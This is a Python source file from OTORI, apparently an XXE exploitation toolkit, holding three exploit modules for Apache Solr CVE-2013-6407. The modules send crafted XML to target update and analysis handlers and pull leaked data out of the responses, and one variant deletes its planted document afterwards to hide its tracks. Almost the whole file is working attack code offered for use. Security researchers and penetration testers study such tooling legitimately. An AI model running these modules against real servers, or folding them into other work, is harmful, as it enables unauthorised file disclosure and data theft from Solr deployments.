#!/usr/bin/python

# On The Outside, Reaching In ("OTORI")
# Copyright 2014 Ben Lincoln
# http://www.beneaththewaves.net/
#

# This file is part of On The Outside, Reaching In ("OTORI").

# On The Outside, Reaching In ("OTORI") is free software: you can redistribute it and/or modify
# it under the terms of version 3 of the GNU General Public License as published by
# the Free Software Foundation.

# On The Outside, Reaching In ("OTORI") is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.

# You should have received a copy of the GNU General Public License
# along with On The Outside, Reaching In ("OTORI") (in the file LICENSE.txt).  
# If not, see <http://www.gnu.org/licenses/>.

import base64
import httplib
import inspect
import json
import os
import random
import re
import sys
import urllib

import libdeceitfulhttp
import liboutput
import libxxeexploits

# parent class for all modules related to CVE-2013-6407 - Apache Solr
# is not actually instantiated on its own
class XXESolrCVE20136407(libxxeexploits.XXEHTTP):
	def __init__(self, uid, name):
		libxxeexploits.XXEHTTP.__init__(self, uid, name)
		self.SupportsDirectoryListings = True
		
# CVE-2013-6407 - Apache Solr - DocumentAnalysisRequestHandler Variation		
class XXESolrCVE20136407DARH(XXESolrCVE20136407):
	def __init__(self):
		uid = "CVE-2013-6407-DARH"
		name = "Apache Solr (<= 4.3) - CVE-2013-6407 - DocumentAnalysisRequestHandler"
		XXESolrCVE20136407.__init__(self, uid, name)
		self.AddNextOption('DocumentAnalysisRequestHandlerURL', 'Solr DocumentAnalysisRequestHandler URL (e.g. http://targetserver:8983/solr/analysis/document)', None, True)
		self.AddNextOption('DocumentUniqueIDFieldName', 'The name of the field in the Solr schema for documents which is used as a unique identifier', 'id', False)
		
	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'DocumentAnalysisRequestHandlerURL', 0)
		self.SetOptionalParameter(args, 'DocumentUniqueIDFieldName', 1)
		
	def SendXXEMessage(self, messageVariables, isSystemEntity):

		xxexmlmessage = self.GetModuleDataFile('xxe-01.txt')
		# override the default %ELEMENT% value with a fixed name of 'field', because that's what Solr requires
		messageVariables['%ELEMENT%'] = 'field'
		messageVariables['%UIDFIELDNAME%'] = self.GetOptionByName('DocumentUniqueIDFieldName').CurrentValue

		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)
		
		httpHeaders = self.GetStandardHTTPHeaders()
		httpHeaders['Accept'] = 'application/xhtml+xml,application/xml'
		httpHeaders['Content-Type'] = 'text/xml'
		response = self.SendRequest("POST", self.GetOptionByName('DocumentAnalysisRequestHandlerURL').CurrentValue, xxexmlmessage, httpHeaders)
		result = self.ParseDelimitedResponse(messageVariables, response, libxxeexploits.ResponseParserSettingsJava())
		return result
		
		
# CVE-2013-6407 - Apache Solr - UpdateRequestHandler Variation - multiple values encountered for non multiValued field	sub-variation
class XXESolrCVE20136407URHNMVF(XXESolrCVE20136407):
	def __init__(self):
		uid = "CVE-2013-6407-URH-NMVF"
		name = "Apache Solr (< 4.1) - CVE-2013-6407 - UpdateRequestHandler - Non-Multivalued Field"
		# generate this once so that the same one can be reused and then cleaned up at the end
		self.DocumentID = libdeceitfulhttp.RandomXMLTagGenerator().generateTag()
		XXESolrCVE20136407.__init__(self, uid, name)
		self.AddNextOption('UpdateRequestHandlerURL', 'Solr UpdateRequestHandler URL (e.g. http://targetserver:8983/solr/update)', None, True)
		self.AddNextOption('DocumentUniqueIDFieldName', 'The name of the field in the Solr schema for documents which is used as a unique identifier', 'id', False)
		
	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'UpdateRequestHandlerURL', 0)
		self.SetOptionalParameter(args, 'DocumentUniqueIDFieldName', 1)
		
	# this exploit is a simple single-request variation on the UpdateRequestHandler vulnerability
	# it works in very old versions of Solr (e.g. 1.4.1)
	# it intentionally sends a request in which multiple values are specified for a field which only allows a single value
	# the data of interest is included in the error response

	def SendXXEMessage(self, messageVariables, isSystemEntity):
		
		xxexmlmessage = self.GetModuleDataFile('xxe-01.txt')
		# override the default %ELEMENT% value with a fixed name of 'field', because that's what Solr requires
		messageVariables['%ELEMENT%'] = 'field'
		messageVariables['%UIDFIELDNAME%'] = self.GetOptionByName('DocumentUniqueIDFieldName').CurrentValue
		messageVariables['%DOCUMENTID%'] = self.DocumentID
		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)
		
		httpHeaders = self.GetStandardHTTPHeaders()
		httpHeaders['Accept'] = 'application/xhtml+xml,application/xml'
		httpHeaders['Content-Type'] = 'text/xml'
		insertURL = self.GetOptionByName('UpdateRequestHandlerURL').CurrentValue + '?commit=true'
		response = self.SendRequest("POST", insertURL, xxexmlmessage, httpHeaders)
		result = self.ParseDelimitedResponse(messageVariables, response, libxxeexploits.ResponseParserSettingsJava())
		return result
		
# CVE-2013-6407 - Apache Solr - UpdateRequestHandler Variation	- document insert sub-variation	
class XXESolrCVE20136407URHDI(XXESolrCVE20136407):
	def __init__(self):
		uid = "CVE-2013-6407-URH-DI"
		name = "Apache Solr (< 4.1) - CVE-2013-6407 - UpdateRequestHandler - Document Insert"
		# generate this once so that the same one can be reused and then cleaned up at the end
		self.DocumentID = libdeceitfulhttp.RandomXMLTagGenerator().generateTag()
		XXESolrCVE20136407.__init__(self, uid, name)
		self.AddNextOption('UpdateRequestHandlerURL', 'Solr UpdateRequestHandler URL (e.g. http://targetserver:8983/solr/update)', None, True)
		self.AddNextOption('SelectRequestHandlerURL', 'The URL of the Solr select handler to use for reading back data (e.g. http://targetserver:8983/solr/select)', None, True)
		self.AddNextOption('DocumentUniqueIDFieldName', 'The name of the field in the Solr schema for documents which is used as a unique identifier', 'id', False)
		self.AddNextOption('DocumentDataFieldName', 'The name of the field in the Solr schema for documents which should be used to hold the data returned via XXE', 'name', False)

	def SetOptionsFromCommandLineArgs(self, args):
		self.SetRequiredParameter(args, 'UpdateRequestHandlerURL', 0)
		self.SetRequiredParameter(args, 'SelectRequestHandlerURL', 1)
		self.SetOptionalParameter(args, 'DocumentUniqueIDFieldName', 2)
		self.SetOptionalParameter(args, 'DocumentDataFieldName', 3)
		
	# this exploit is similar to the one for the DocumentAnalysisRequestHandler, but requires at least two steps instead of 1:
	# 1 - send the document update request
	# 2 - perform a query to read the results back
	# 3 - (optionally) delete the document that was used for XXE
	# it requires two target URLs: the update handler and the query/select handler
	# update?commit=true
	# select?q=id%3A"xxe_doc_id"%0A&wt=xml&indent=true

	def SendXXEMessage(self, messageVariables, isSystemEntity):
		xxexmlmessage = self.GetModuleDataFile('xxe-01.txt')
		# override the default %ELEMENT% value with a fixed name of 'field', because that's what Solr requires
		messageVariables['%ELEMENT%'] = 'field'
		messageVariables['%UIDFIELDNAME%'] = self.GetOptionByName('DocumentUniqueIDFieldName').CurrentValue
		messageVariables['%DATAFIELDNAME%'] = self.GetOptionByName('DocumentDataFieldName').CurrentValue
		messageVariables['%DOCUMENTID%'] = self.DocumentID
		xxexmlmessage = self.ActualizeTemplate(xxexmlmessage, messageVariables)
		
		httpHeaders = self.GetStandardHTTPHeaders()
		httpHeaders['Accept'] = 'application/xhtml+xml,application/xml'
		httpHeaders['Content-Type'] = 'text/xml'
		
		# insert the new document
		updateURL = self.GetOptionByName('UpdateRequestHandlerURL').CurrentValue + '?commit=true'
		response1 = self.SendRequest("POST", updateURL, xxexmlmessage, httpHeaders)
		
		# query for it by ID
		queryURL = self.GetOptionByName('SelectRequestHandlerURL').CurrentValue + '?q=id%3A"' + self.DocumentID + '"%0A&wt=xml&indent=true'
		response2 = self.SendRequest("GET", queryURL, '', httpHeaders)

		# parse the second response
		result = self.ParseDelimitedResponse(messageVariables, response2, libxxeexploits.ResponseParserSettingsJava())
		
		# attempt to delete the document, but wrap the whole block in a try/catch so that even if the delete fails, 
		# any data obtained is returned
		deletedDoc = False
		try:
			# delete the document that was created earlier
			deletexmlmessage = self.GetModuleDataFile('xxe-02.txt')
			
			deletexmlmessage = self.ActualizeTemplate(deletexmlmessage, messageVariables)
			response3 = self.SendRequest("POST", updateURL, deletexmlmessage, httpHeaders)
			
			# should add a check here to query for the document again and make sure it was really deleted
			# query for it by ID again
			response4 = self.SendRequest("GET", queryURL, '', httpHeaders)
			# parse the fourth response
			checkResult = self.ParseDelimitedResponse(messageVariables, response4, libxxeexploits.ResponseParserSettingsJava())
			if (result.ResponseBody == checkResult.ResponseBody):
				self.LogWarning('The document entry in Solr used to perform the XXE attack (ID "' + self.DocumentID + '") may not have been successfully deleted after use - a query for its ID returned a result that matched the value that should have been deleted')
			else:
				deletedDoc = True
		except Exception as e:
			deletedDoc = False
			self.LogError('The document entry in Solr used to perform the XXE attack (ID "' + self.DocumentID + '") may not have been successfully deleted after use - an exception was thrown while attempting the delete operation: ' + str(type(e)) + ' - ' + str(e.args))
			
		return result
